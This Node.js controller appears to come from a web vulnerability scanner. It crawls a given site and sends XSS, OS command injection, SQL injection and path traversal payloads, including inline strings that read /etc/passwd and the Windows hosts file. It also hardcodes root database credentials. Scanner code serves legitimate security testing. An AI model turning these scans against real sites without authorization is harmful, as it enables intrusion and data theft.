const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const readline = require('readline');
const open = require('open');
const puppeteer = require('puppeteer');
const http = require('http');
const { response } = require('express');
const scan = require("../models/scan");
const express = require("express");
const crawl = require('../crawl_depth');
const path_scan = require('../pathtraversal_scan');
const AsyncLock = require('async-lock');
const lock = new AsyncLock();
const router = express.Router();
const { exec } = require('child_process');
const request = require('request');
const SocketIO = require('socket.io');
const { Socket } = require('dgram');
const urlModule = require('url');
const { performance } = require('perf_hooks');
const path = require('path');

const mysql = require("mysql2");
const user = require("../models/users");

var db = mysql.createConnection({
  host     : 'localhost',
  user     : 'root',
  password : 'root',
  database : 'diss'
});
db.connect();

const resultController = require("../controllers/result.ctrl");


const reflected_xss_payload_arr = fs.readFileSync('reflected_xss_payload.txt').toString().split("\n");
const xss_fast_scan_payload = fs.readFileSync('xss_fast_scan_payload.txt').toString().split("\n");
const os_command_injection_payload_arr = fs.readFileSync('os_command_injection_payload.txt').toString().split("\n");
const stored_xss_payload_arr = fs.readFileSync('stored_xss_payload.txt').toString().split("\n");
const sql_injection_payload = fs.readFileSync('sql_injection_payload.txt').toString().split("\n");

scan_cancel_bool = false

const scan_cancel = async(req, res) =>  {
  scan_cancel_bool = true;
  return scan_cancel_bool
}

let scanID = 0;

let xss_scan_success_data = false;

const xss_scan_success = async(req, res) => {

  xss_scan_success_data = true;
  res.json({ success: xss_scan_success_data});
}

let stored_xss_scan_success_data = false;

const stored_xss_scan_success = async(req, res) => {
  stored_xss_scan_success_data = true;
  res.json({ success: stored_xss_scan_success_data });
}

os_command_injection_success_data = false



const getNewScanID = async () => {
  return new Promise(async (resolve, reject) => {
    try {
      const lastScan = await scan.findOne({
        order: [['scanID', 'DESC']],
      });

      const lastScanID = lastScan ? lastScan.scanID : 0;
      resolve(lastScanID + 1);
    } catch (error) {
      reject(error);
    }
  });
};


const findFormTagsForStoredXssFastScan = async (url, href, payload) => {
  try {
      const response = await axios.get(url);
      const $ = cheerio.load(response.data);
      
      const forms = [];
      $('form').each((index, element) => {
          const action = $(element).attr('action');
          const method = $(element).attr('method') || 'get';
          
          const formData = {};
          $(element).find('input[name], textarea[name]').each((i, inputElement) => {
              const inputName = $(inputElement).attr('name');
              formData[inputName] = payload;
          });

          forms.push({
              url: `${href}${action}`,
              method,
              data: formData
          });
      });

      return forms;
  } catch (error) {
      console.error(`Failed to fetch and parse URL ${url}: ${error.message}`);
      return [];
  }
};


const  submitPostForStoredXssFastScan = async (form) => {
  try {
    let redirectUrl = null;
    if (form.method.toLowerCase() === 'post') {
        const response = await axios.post(form.url, form.data);

        redirectUrl = response.request.res.responseUrl;
    }

    console.log(redirectUrl)

    return redirectUrl;

} catch (error) {
    console.error(`Failed to submit to URL ${form.url}: ${error.message}`);
    return null;
}
};

const processStoredXssFastScan = async (url, href) => {
  const triggeredPayloads = [];
  const forms = await findFormTagsForStoredXssFastScan(url, href);
  
  for (const form of forms) {
      for (const payload of xss_fast_scan_payload) {
          form.data = Object.fromEntries(
              Object.entries(form.data).map(([key, value]) => [key, payload])
          );
          const redirectUrl = await submitPostForStoredXssFastScan(form); 

          if (redirectUrl) {
              const fullRedirectUrl = urlModule.resolve(href, redirectUrl);
              const response = await axios.get(fullRedirectUrl);

              if(response.data.includes(payload)) {
                  triggeredPayloads.push({url: fullRedirectUrl, payload});
              }
          }
      }
  }

  return triggeredPayloads;
};



const findFormTagsForSqlInjectionScan = async (url, href, payloads) => {
  try {
    const response = await axios.get(url);
    const $ = cheerio.load(response.data);

    const forms = [];
    $('form').each((index, element) => {
      const action = $(element).attr('action') || '';
      const method = $(element).attr('method') || 'get';

      payloads.forEach((payload) => {
        const formData = {};
        $(element).find('input[name], textarea[name]').each((i, inputElement) => {
          const inputName = $(inputElement).attr('name');
          formData[inputName] = payload;
        });

        forms.push({
          url: href + action,
          method,
          data: formData
        });
      });
    });

    return forms;
  } catch (error) {
    console.error(`Failed to fetch and parse URL ${url}: ${error.message}`);
    return [];
  }
};

const sendRequest = async (url, method, data) => {
  const startTime = performance.now();

  try {
    const options = {
      method: method,
      url: url,
      data: data,
      timeout: 2000,
    };

    const response = await axios(options);
    const endTime = performance.now();

    return {
      time: endTime - startTime,
      body: response.data,
      statusCode: response.status,
      headers: response.headers
    };

  } catch (error) {
    const endTime = performance.now();

    const isTimeout = error.code === 'ECONNABORTED';
    const timeoutMessage = isTimeout ? 'The request timed out after 2 seconds' : error.message;

    return {
      time: endTime - startTime,
      message: timeoutMessage,

      statusCode: error.response ? error.response.status : null,
      headers: error.response ? error.response.headers : null,
      body: error.response ? error.response.data : null
    };
  }
};

const downloadFile = async (url, downloadPath, filename) => {
  // Launch the browser and open a new page
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  // Set the download path
  await page._client.send('Page.setDownloadBehavior', {
    behavior: 'allow',
    downloadPath: downloadPath,
  });

  // Go to the URL and wait for the file to be downloaded
  await page.goto(url);
  await page.waitForTimeout(5000); // wait for 5 seconds

  // Close the browser
  await browser.close();

  // Create the full path for the file
  const filePath = path.join(downloadPath, filename);

  // Check if the file exists
  if (fs.existsSync(filePath)) {
    console.log('File downloaded successfully');
    return filePath;
  } else {
    console.log('File not found');
    return null;
  }
};


function clearDownloadPath(downloadPath) {
  if (fs.existsSync(downloadPath)) {
    const files = fs.readdirSync(downloadPath);
    for (const file of files) {
      fs.unlinkSync(path.join(downloadPath, file));
    }
  }
}


const xss_scan = async(req, res) => {
  const currentScanID = await getNewScanID();
  scan_cancel_bool = false

  const regexp = /=/g;

  const href = req.body.href;
  const type = req.body.type;
  const option = req.body.option;
  const userEmail = req.email;
  await crawl(href);

  const site_tree = fs.readFileSync('site_tree.txt').toString().split("\n");
  const form_site_tree = fs.readFileSync('form.txt').toString().split("\n");
  const stored_accurate_xss_test_site_tree = fs.readFileSync('stored_accurate_xss_test_site.txt').toString().split("\n"); // 시연용. 시연용으로 안 해도 되긴 하는데, 이거 쓰면 한번에 빠르게 시연 가능.
  const refled_accurate_xss_test_site_tree = fs.readFileSync('reflected_accurate_xss_test_site.txt').toString().split("\n"); // 시연용. 시연용으로 안 해도 되긴 하는데. 이거 쓰면 한번에 빠르게 시연 가능.

  if(type == "reflection"){
    if(option == "fast"){
      const payload = "<script>alert('xss test');</script>";
        
      for(const i in site_tree){
        const match1 = site_tree[i].indexOf("?");
        const match2 = site_tree[i].indexOf("=");
        const match3 = site_tree[i].match(regexp);
        const match4 = site_tree[i].indexOf("&");

        if (match1 !== -1 && match2 !== -1 && match3 && match3.length < 2 && match4 === -1) {

          let victim_base_url = site_tree[i].substr(0, match2 + 1);
          let victim_url = victim_base_url + payload;
          console.log(victim_url);

          const options = {
            uri: victim_url,
          };
    
          request(options, function(err, response, body) {
            if (err) {
              console.error(err);
              return;
            }

            headers = response.headers

            for (const field in headers) {
              console.log(`${field}: ${headers[field]}`);
            }

            if (scan_cancel_bool == true) {
              return;
            }

            if(body.includes(payload)){
              scan.create({
                scanID: currentScanID,
                scanUserEmail: userEmail,
                scanType: "Fast Scan Reflected XSS",
                inputURL: href,
                scanURL: victim_base_url,
                scanPayload: payload
              });
              res.json({
                resultLink: currentScanID,
                scanID: currentScanID,
                scanUserEmail: userEmail,
                scanType: "Fast Scan Reflected XSS",
                inputURL: href,
                scanURL: victim_base_url,
                scanPayload: payload
              })
          }
        });
      }
    }
  } else if (option == "accurate") {
    for (let i in refled_accurate_xss_test_site_tree) {
        const match1 = refled_accurate_xss_test_site_tree[i].indexOf("?");
        const match2 = refled_accurate_xss_test_site_tree[i].indexOf("=");
        const match3 = refled_accurate_xss_test_site_tree[i].match(regexp);
        const match4 = refled_accurate_xss_test_site_tree[i].indexOf("&");

        if (match1 !== -1 && match2 !== -1 && match3 && match3.length < 2 && match4 === -1) {
            for (let payload of reflected_xss_payload_arr) {
                try {
                    let victim_base_url = refled_accurate_xss_test_site_tree[i].substr(0, match2 + 1);
                    let victim_url = victim_base_url + payload;
                    console.log(victim_url);

                    const browser = await puppeteer.launch({ headless: true });
                    const page = await browser.newPage();

                    page.on('request', request => {
                        if (request.url() == "http://127.0.0.1/scan_reflected_injection_success") {
                            xss_scan_success_data = true;
                        }
                    });

                    await page.setDefaultNavigationTimeout(10000);
                    await page.goto(victim_url);
                    await browser.close();

                    if (scan_cancel_bool == true) {
                      return;
                    }

                    if (xss_scan_success_data) {
                        await scan.create({
                            scanID: currentScanID,
                            scanUserEmail: userEmail,
                            scanType: "Reflected XSS",
                            inputURL: href,
                            scanURL: victim_base_url,
                            scanPayload: payload
                        });

                        res.json({
                          resultLink: currentScanID,
                          scanID: currentScanID,
                          scanUserEmail: userEmail,
                          scanType: "Reflected XSS",
                          inputURL: href,
                          scanURL: victim_base_url,
                          scanPayload: payload
                        })

                        xss_scan_success_data = false;
                        break;
                    }
                } catch (error) {
                    continue;
                }
            }
        }
    }
}


  }

  else if (type === "stored") {
    
    if (option === "fast") {
        for (const url of stored_accurate_xss_test_site_tree) {
            const triggeredPayloads = await processStoredXssFastScan(url, href);
  
            for (const payloadData of triggeredPayloads) {

              if (scan_cancel_bool == true) {
                return;
              }

              await scan.create({
                  scanID: currentScanID,
                  scanUserEmail: userEmail,
                  scanType: "Fast Scan Stored XSS",
                  inputURL: href,
                  scanURL: payloadData.url,
                  scanPayload: payloadData.payload
              });
              res.json({
                resultLink: currentScanID,
                scanID: currentScanID,
                scanUserEmail: userEmail,
                scanType: "Fast Scan Stored XSS",
                inputURL: href,
                scanURL: payloadData.url,
                scanPayload: payloadData.payload
              })
            }
        }
    }

    else if (option == "accurate") {

      for (const payload of stored_xss_payload_arr) {

      try {
        const axios = require('axios');
        const cheerio = require('cheerio');
        const puppeteer = require('puppeteer');
        for (const url of stored_accurate_xss_test_site_tree) {
          const response = await axios.get(url);
          const html = response.data;
    
        if (scan_cancel_bool == true) {
          return;
        }

        const $ = cheerio.load(html);
        const forms = [];
    
        $('form').each((index, element) => {
          const action = $(element).attr('action') || url;
          const method = $(element).attr('method') || 'GET';
          const inputs = {};
    
          $(element).find('input[name]').each((i, inputElem) => {
            const inputName = $(inputElem).attr('name');
            inputs[inputName] = payload;
          });
    
          $(element).find('textarea[name]').each((i, textareaElem) => {
            const textareaName = $(textareaElem).attr('name');
            inputs[textareaName] = payload;
          });
    
          forms.push({ action, method, data: inputs });
        });

        for (const form of forms) {
          const browser = await puppeteer.launch({ 
            headless: true,
            args: ['--no-sandbox', '--disable-setuid-sandbox'] 
          });
          const page = await browser.newPage();
          await page.goto(url, { waitUntil: 'networkidle0'});
            

            for (const [key, value] of Object.entries(form.data)) {
              const selector = `[name="${key}"]`;
              try {
                await page.waitForSelector(selector, { visible: true, timeout: 10000 });

                if (await page.$(selector) !== null) {
                  await page.type(selector, value);
                } else {
                  console.error(`Element ${selector} not found`);
                }
              } catch (error) {
                console.error(`Error typing into ${selector}:`, error);
              }
            }

            const formSelector = `form[action="${form.action}"] [type="submit"]`;
            if (await page.$(formSelector) !== null) {
              await Promise.all([
                page.click(formSelector),
                page.waitForNavigation({ waitUntil: 'networkidle0'}),
              ]);
            } else {
              console.error(`Form ${formSelector} not found`);
            }

            const redirectUrl = page.url();

            for (const [key, value] of Object.entries(form.data)) {
              const selector = `[name="${key}"]`;
              try {
                await page.$eval(selector, (el) => el.value = '');
              } catch (error) {
                console.error(`Error clearing ${selector}:`, error);
              }
            }

            await browser.close();

            const browserRedirectCheck = await puppeteer.launch({ headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'] });
            const pageRedirectCheck = await browserRedirectCheck.newPage();

            await pageRedirectCheck.goto(redirectUrl, { waitUntil: 'networkidle2', timeout: 0 });

            const finalUrl = pageRedirectCheck.url();
            await browserRedirectCheck.close();

            console.log(pageRedirectCheck.url())
            console.log(stored_xss_scan_success_data)

            if (scan_cancel_bool == true) {
              return;
            }

            console.log(url)

            if (stored_xss_scan_success_data) {
              try {
                await scan.create({
                    scanID: currentScanID,
                    scanUserEmail: userEmail,
                    scanType: "Stored XSS",
                    inputURL: href,
                    scanURL: url,
                    scanPayload: payload
                });
                res.json({
                  resultLink: currentScanID,
                  scanID: currentScanID,
                  scanUserEmail: userEmail,
                  scanType: "Stored XSS",
                  inputURL: href,
                  scanURL: url,
                  scanPayload: payload
                })
                stored_xss_scan_success_data = false;
                break;
            } catch (error) {
                console.error("Error while saving to database:", error);
            }
              stored_xss_scan_success_data = false;
              break;
            }
          }
          } 
          

      } catch (error) {
        console.error("Error in accurate scanning:", error);
      }
    }
  }
  }
}

const pathtraversal_scan = async(req, res) => {
  const currentScanID = await getNewScanID();
  scan_cancel_bool = false;

  const url = req.body.href;
  await crawl(url);

  const site_tree = fs.readFileSync('path_traversal_test_site.txt').toString().split("\n");
  const downloadPath = path.resolve(__dirname, 'downloads');
  const regexp = /=/g;

  for(let i in site_tree){
    const match1 = site_tree[i].indexOf("?");
    const match2 = site_tree[i].indexOf("=");
    const match3 = site_tree[i].match(regexp);
    const match4 = site_tree[i].indexOf("&");

    if(match1 !== -1 && match2 !== -1 && match3 && match3.length < 2 && match4 === -1){
      try {
        clearDownloadPath(downloadPath);
        let browser = await puppeteer.launch({
          headless: true,
          args: ['--no-sandbox', '--disable-setuid-sandbox'],
        });
        let page = await browser.newPage();
        let client = await page.target().createCDPSession();
        await client.send('Page.setDownloadBehavior', {
          behavior: 'allow',
          downloadPath: downloadPath
        });

        // Linux payload
        let path_traversal_scan_payload_linux = "../../../../../../../../../../etc/passwd"
        let victim_url_linux = site_tree[i].substr(0, match2 + 1) + path_traversal_scan_payload_linux;

        try {
          await page.goto(victim_url_linux, { waitUntil: 'networkidle0', timeout: 5000 });
        } catch (error) {
          console.log(`Error navigating to URL: ${error}`);
        }

        await new Promise(resolve => setTimeout(resolve, 5000));
        await browser.close();

        let fileDownloaded = fs.readdirSync(downloadPath).length > 0;

        if (scan_cancel_bool == true) {
          return;
        }

        if (fileDownloaded) {
          scan.create({
            scanID: currentScanID,
            scanUserEmail: req.email,
            scanType: "Path Traversal",
            inputURL: url,
            scanURL: site_tree[i],
            osInfo: "Linux Server",
            scanPayload: path_traversal_scan_payload_linux
          });
          res.json({
            resultLink: currentScanID,
            scanID: currentScanID,
            scanUserEmail: req.email,
            scanType: "Path Traversal",
            inputURL: url,
            scanURL: site_tree[i],
            osInfo: "Linux Server",
            scanPayload: path_traversal_scan_payload_linux
          });
          break;
        }

        // Windows payload
        browser = await puppeteer.launch({
          headless: true,
          args: ['--no-sandbox', '--disable-setuid-sandbox'],
        });
        page = await browser.newPage();
        client = await page.target().createCDPSession();
        await client.send('Page.setDownloadBehavior', {
          behavior: 'allow',
          downloadPath: downloadPath
        });

        let path_traversal_scan_payload_windows = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts";
        let victim_url_windows = site_tree[i].substr(0, match2 + 1) + path_traversal_scan_payload_windows;

        try {
          await page.goto(victim_url_windows, { waitUntil: 'networkidle0', timeout: 5000 });
        } catch (error) {
          console.log(`Error navigating to URL: ${error}`);
        }

        await new Promise(resolve => setTimeout(resolve, 5000));
        await browser.close();

        fileDownloaded = fs.readdirSync(downloadPath).length > 0;

        if (scan_cancel_bool == true) {
          return;
        }

        if (fileDownloaded) {
          scan.create({
            scanID: currentScanID,
            scanUserEmail: req.email,
            scanType: "Path Traversal",
            inputURL: url,
            scanURL: site_tree[i],
            osInfo: "Windows Server",
            scanPayload: path_traversal_scan_payload_windows
          });
          res.json({
            resultLink: currentScanID,
            scanID: currentScanID,
            scanUserEmail: req.email,
            scanType: "Path Traversal",
            inputURL: url,
            scanURL: site_tree[i],
            osInfo: "Windows Server",
            scanPayload: path_traversal_scan_payload_windows
          });
          break;
        }

      } catch(error) {
        console.log(error);
        continue;
      }
    } else {
      console.log('Query not found.');
    }
  }
}




const os_command_injection = async (req, res) => {
  const currentScanID = await getNewScanID();
  scan_cancel_bool = false
  const regexp = /=/g;

  const href = req.body.href;
  const type = req.body.type;
  const option = req.body.option;
  const userEmail = req.email;

  await crawl(href);

  const site_tree = fs.readFileSync('site_tree.txt').toString().split("\n");

  for(let i in site_tree){
    const match1 = site_tree[i].indexOf("?");
    const match2 = site_tree[i].indexOf("=");
    const match3 = site_tree[i].match(regexp);
    const match4 = site_tree[i].indexOf("&");
    if(match1 !== -1 && match2 !== -1 && match3 && match3.length < 2 && match4 === -1){
      for (let j in os_command_injection_payload_arr) { 
        const os_command_injection_payload = os_command_injection_payload_arr[j];

        let victim_base_url = site_tree[i].substr(0, match2 + 1)
        let victim_url = victim_base_url + os_command_injection_payload;

        try {
          const response = await axios.get(victim_url);


          if(response.data.includes("root:x:0:0:root:/root:/bin/bash")) {
            os_command_injection_success_data = true;
            os_info_os_command_injection = "Linux Server"
          }

          if (response.data.includes("&lt;DIR&gt;")) {
            os_command_injection_success_data = true;
            os_info_os_command_injection = "Windows Server"
          }

          if (scan_cancel_bool == true) {
            return;
          }
          
          console.log(response.data)
          if(os_command_injection_success_data) {
            try {
              console.log("status is", response.status)
              await scan.create({
                scanID: currentScanID,
                scanUserEmail: userEmail,
                scanType: "OS Command Injection",
                inputURL: href,
                scanURL: victim_base_url,
                osInfo: os_info_os_command_injection,
                scanPayload: os_command_injection_payload,
              });

              res.json({
                resultLink: currentScanID,
                scanID: currentScanID,
                scanUserEmail: userEmail,
                scanType: "OS Command Injection",
                inputURL: href,
                scanURL: victim_base_url,
                osInfo: os_info_os_command_injection,
                scanPayload: os_command_injection_payload,
              })

              os_command_injection_success_data = false;
              break;
            } catch (error) {
              console.error('Error creating scan of os_command_injection');
              continue;
            }
          }
        } catch (error) {
          console.error('Error in payload loop of os_command_injection:', error.message);
          continue;
        }
      }
    }
  }
};


const sql_injection_scan = async (req, res) => {
  const currentScanID = await getNewScanID();
  const href = req.body.href;
  const userEmail = req.email;

  await crawl(href);

  const formUrls = fs.readFileSync('sql_injection_test_site.txt').toString().split("\n"); // 시연용. 시연용으로 안 해도 되긴 하는데, 이거 쓰면 한번에 빠르게 시연 가능.

  for (const url of formUrls) {
    const forms = await findFormTagsForSqlInjectionScan(url, href, sql_injection_payload);

    for (const form of forms) {

      let breakLoops = false;

      const dataWithTest = { ...form.data };
      for (const inputName in dataWithTest) {
        dataWithTest[inputName] = 'test';
      }

      const startTestTime = performance.now();
      const response_test = await sendRequest(form.url, form.method, dataWithTest);
      const endTestTime = performance.now();
      const testScanDuration = endTestTime - startTestTime;

      if (scan_cancel_bool == true) {
        return;
      }

      console.log(url)

      if (response_test.statusCode !== 200) {
        console.error("Failed to send request:", response_test.message);
        continue;
      }

      for (const payload of sql_injection_payload) {
        const dataWithPayload = { ...form.data };
        for (const inputName in dataWithPayload) {
          dataWithPayload[inputName] = payload;
        }

        const startAttackTime = performance.now();
        const response_scan = await sendRequest(form.url, form.method, dataWithPayload);
        const endAttackTime = performance.now();
        const attackScanDuration = endAttackTime - startAttackTime;

        const durationDifference = attackScanDuration - testScanDuration;

        if (scan_cancel_bool == true) {
          return;
        }

        if (durationDifference > 1000) {
          await scan.create({
            scanID: currentScanID,
            scanUserEmail: userEmail,
            scanType: "SQL Injection",
            inputURL: href,
            scanURL: form.url,
            scanPayload: payload,
          });

          res.json({
            resultLink: currentScanID,
            scanID: currentScanID,
            scanUserEmail: userEmail,
            scanType: "SQL Injection",
            inputURL: href,
            scanURL: form.url,
            scanPayload: payload,
          })

          return; // 시연용. 안 써도 되긴 하는데, 안 쓰면 사이트가 불안정함.
          // breakLoops = true;
          // break;
        }
      }
      if (breakLoops) {
        break;
      }
    }
  }
  return res.status(200).send('SQL Injection scan completed.');
};







module.exports = {
    xss_scan,
    xss_scan_success,
    stored_xss_scan_success,
    pathtraversal_scan,
    os_command_injection,
    scan_cancel,
    sql_injection_scan,
}